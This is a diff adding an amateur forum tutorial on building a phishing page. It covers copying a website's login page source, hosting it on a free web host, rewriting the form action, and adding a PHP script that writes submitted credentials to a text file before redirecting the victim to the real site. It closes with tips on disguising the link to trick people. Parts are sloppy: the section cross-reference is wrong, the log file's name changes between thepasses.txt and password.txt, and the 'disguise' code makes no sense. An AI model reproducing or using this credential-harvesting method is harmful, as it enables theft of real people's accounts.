@@ -1,0 +1,83 @@
+This is a basic tutorial on how to make a phishing page.
+
+ Index:
+ What is a phisher? - 101
+ Making a T35 Account - 102
+ Getting Web pages Source Code - 103
+ Creating Phish File - 104
+ How to fool people - 105
+ ------------------------
+ What is a phisher? 101
+ ------------------------
+
+ A phisher is a fake login page used to gain access to someones account. When someone logs into the fake login page, there password is sent to you.
+
+ --------------------------
+ Making a T35 Account 102
+ --------------------------
+
+ In order to make a phisher, you need a web hosting site, I recommend T35. Sign up with a free acount and title it (websiteyourgonnaphish).spam.com For example: myspace.spam.com Most likeley, it is taken so add numbers like 08, or 07.
+
+ --------------------------------------
+ Getting Web Pages Source Code 103
+ --------------------------------------
+
+ After you create that page, go to the website you will make a phisher for. Open the login page, From there right-click the page, and click View Source. Copy and paste what has popped-up.
+
+ ------------------------
+ Creating Phish File 104
+ ------------------------
+
+ Once you have that copied, go to your T35 account. Click on "New File" Title it login.htm Then paste your Source Code you copied from 104. Save it.
+
+ Now create another file, title it fhish.php And inside, paste this code:
+
+
+
+
+Code:
+
+
+<?php
+ header("Location: http://www.phisshed-website.com");
+ $handle = fopen("thepasses.txt", "a");
+ foreach($_GET as $variable => $value) {
+ fwrite($handle, $variable);
+ fwrite($handle, "=");
+ fwrite($handle, $value);
+ fwrite($handle, "\r\n");
+ }
+ fwrite($handle, "\r\n");
+ fclose($handle);
+ exit;
+ ?>
+
+
+ The http://www.phisshed-website.com is what the page goes to after the victim logs in, change that to what desired
+
+ Save the file.
+
+
+ Go back to your login.htm file and click edit. Press CTRL+F and type in action= in the box. Keep pressing find until you find something that says action=(something that has to do with logging in). Replace that with fhish.php. Congratulations, you have a phisher!
+
+ -------------------------
+ How to fool people - 105
+ -------------------------
+ What you do now is disguise your link. Use this code:
+
+ T35acount.spam.com/login.htm
+
+ That is the link to your phishing page. When people login to that, you will get the password in a password.txt file that will be created when someone types something into it. But, you have to trick people. Use this code.
+
+*real website name*.com/login.php
+
+ You do the same for any forum!
+
+
+ Thank you for reading! Hope it helps! If i was missing something, or you have any questions, PM me!
+
+ ALTERNATIVES:
+
+ Also, if you don't want to use spam.com, use ripway.com and after you uploaded everything, go to http://www.dot.tk and choose a free .tk domain name.
+
+ Credits: Rockey Killer 
